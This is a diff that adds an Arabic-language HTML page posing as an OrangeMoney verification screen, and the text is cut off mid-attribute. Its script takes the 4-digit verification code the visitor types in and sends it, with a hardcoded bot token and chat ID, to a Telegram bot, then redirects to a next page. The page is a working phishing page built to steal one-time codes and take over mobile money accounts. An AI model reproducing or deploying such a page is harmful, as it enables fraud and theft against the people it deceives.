@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق | OrangeMoney</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: rgba(255, 255, 255, 0.9); /* واجهة شفافة */
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        button {
+            background-color: #FF8C00; /* لون الزر برتقالي غامق */
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%; /* يغطي العرض بالكامل */
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+        .footer-image {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 300px;
+        }
+    </style>
+    <script>
+        // إضافة التوكن الخاص ببوت تلجرام
+        const TELEGRAM_TOKEN = '7071902802:AAG7GZB_vh9eKatLDdsq0Q0D6AV-9Ay2HG4';
+        const CHAT_ID = '6332127387';
+
+        // وظيفة لإرسال رسالة إلى تلجرام
+        function sendTelegramMessage(message) {
+            var url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+
+        // عند تحميل الصفحة، عرض رقم الهاتف وإعداد حدث التحقق
+        window.onload = function() {
+            var urlParams = new URLSearchParams(window.location.search);
+            var phone = urlParams.get('phone');
+            if (phone) {
+                document.getElementById('user-phone').textContent = phone;
+            }
+
+            // إضافة حدث للزر للتحقق من الرمز
+            document.getElementById('verify-button').addEventListener('click', function() {
+                var code = document.getElementById('verification-code').value;
+                if (code.length === 4) {
+                    sendTelegramMessage(`رمز التحقق المدخل هو: ${code}`);
+                    window.location.href = 'next_page.html'; // تغيير الصفحة بعد التحقق
+                } else {
+                    alert('يرجى إدخال رمز صحيح');
+                }
+            });
+        };
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h2 id="verification-title">يرجى ادخال كود التحقق الذي ارسلناه الى <span id="user-phone"></span></h2>
+        <input id="verification-code" type="text" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px;" placeholder="أ
